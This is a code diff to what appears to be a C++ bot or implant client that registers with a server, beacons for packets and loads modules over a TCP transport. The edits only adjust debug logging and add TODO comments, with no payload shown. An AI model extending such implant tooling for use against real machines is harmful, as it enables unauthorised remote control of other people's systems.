@@ -54,11 +54,9 @@ int LogicController::RegisterBot() {
   try {
     nlohmann::json resp = nlohmann::json::parse(response);
     auto packet_resp = resp.get<std::vector<Packet>>();
-    DEBUG("PARSED PACKET", LEVEL_DEBUG);
     if (packet_resp[0].packetType == REGISTRATION_RESPONSE_CODE) {
       DEBUG("Packet type received: " << packet_resp[0].packetType, LEVEL_DEBUG);
       auto inner_data = nlohmann::json::parse(packet_resp[0].data);
-      DEBUG("PARSED DATA", LEVEL_INFO);
       auto reg_resp = inner_data.get<RegistrationResponse>();
       this->implant_info_.UUID = reg_resp.UUID;
     } else if (packet_resp[0].packetType == ERROR_CODE) {
@@ -67,6 +65,7 @@ int LogicController::RegisterBot() {
       auto reg_error = inner_data.get<Error>();
       DEBUG("Error with registration: " << reg_error.errorNum, LEVEL_ERROR);
       if (reg_error.errorNum == DUPLICATE_REGISTRATION) {
+        DEBUG("Was previously registered, received UUID", LEVEL_DEBUG);
         this->implant_info_.UUID = packet_resp[0].implantInfo.UUID;
         return 0;
       }
@@ -88,7 +87,7 @@ int LogicController::RegisterBot() {
 void LogicController::ThreadHandlerFunc() {
   while (running_) {
     thread_infos_lock_.lock();
-    DEBUG("Checking running threads", LEVEL_INFO);
+    DEBUG("Checking running threads", LEVEL_DEBUG);
     auto thread_info = std::begin(thread_infos_);
     while (thread_info != std::end(thread_infos_)) {
       if (!thread_info->thread.timed_join(0)) {
@@ -106,6 +105,7 @@ void LogicController::ThreadHandlerFunc() {
       }
     }
     thread_infos_lock_.unlock();
+    // TODO determine if this is a good time
     boost::this_thread::sleep_for(boost::chrono::milliseconds(1000));
   }
 
@@ -204,6 +204,7 @@ void LogicController::BeginComms() {
     } catch (...) {
       DEBUG("Error in parsing packet", LEVEL_ERROR);
     }
+    // TODO make this adjustable
     boost::this_thread::sleep_for(boost::chrono::milliseconds(5000));
   }
 
@@ -212,6 +213,7 @@ void LogicController::BeginComms() {
 }
 
 void LogicController::AddModule(ModuleEnum mod) {
+  // TODO revamp this
   switch (mod) {
     case ALL: {
       DEBUG("Adding All Modules", LEVEL_DEBUG);
@@ -238,6 +240,7 @@ void LogicController::SetTransportMethod(TransportEnum transport_enum) {
 }
 
 void LogicController::InitComms(std::string hostname, std::string port) {
+  // TODO Revamp this
   switch (this->transport_method_) {
     case TCP:this->transport_ = std::make_unique<TcpTransport>(std::move(hostname), std::move(port));
       break;
